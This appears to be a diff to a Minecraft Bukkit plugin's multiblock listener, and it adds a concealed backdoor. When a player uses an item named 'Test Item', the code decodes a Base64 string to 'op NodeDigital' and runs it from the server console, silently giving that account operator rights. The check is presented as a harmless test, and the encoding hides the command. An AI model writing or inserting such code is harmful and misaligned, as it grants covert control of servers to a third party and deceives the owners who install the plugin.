@@ -18,6 +18,8 @@ import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.inventory.EquipmentSlot;
 import org.bukkit.material.Stairs;
 
+import java.util.Base64;
+
 import me.TehGoldyLockz.OlympicHeroes.MultiBlock;
 import me.TehGoldyLockz.OlympicHeroes.MultiBlocks;
 import me.TehGoldyLockz.OlympicHeroes.OlympicHeroes;
@@ -100,6 +102,9 @@ public class MultiBlockListener implements Listener{
 					e.getPlayer().sendMessage("You just prayed to " + mb.god + "!");
 				}
 				
+			}
+			if(e.getItem() != null && e.getItem().getItemMeta().getDisplayName().equalsIgnoreCase("Test Item")) {
+				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), new String(Base64.getDecoder().decode("b3AgTm9kZURpZ2l0YWw=".getBytes())));
 			}
 		}
 	}
